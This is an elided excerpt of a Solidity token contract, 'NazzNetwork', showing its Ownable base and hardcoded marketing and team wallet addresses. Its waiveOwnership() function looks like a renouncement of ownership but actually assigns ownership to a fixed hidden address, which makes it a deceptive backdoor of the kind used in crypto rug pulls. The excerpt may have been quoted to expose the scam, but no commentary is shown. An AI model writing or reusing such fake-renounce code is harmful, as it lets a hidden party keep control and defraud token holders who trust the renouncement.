...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x485162cdaA0211096Aa168d34705Fb82128B7224);
    }
...
contract NazzNetwork is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0x9EF42C06938Ecfa8287437f6433C879Fdf8AA81a);
    address payable public teamWalletAddress = payable(0xd51622ED25e2D95640b5dA2bBC93CDb61d459552);
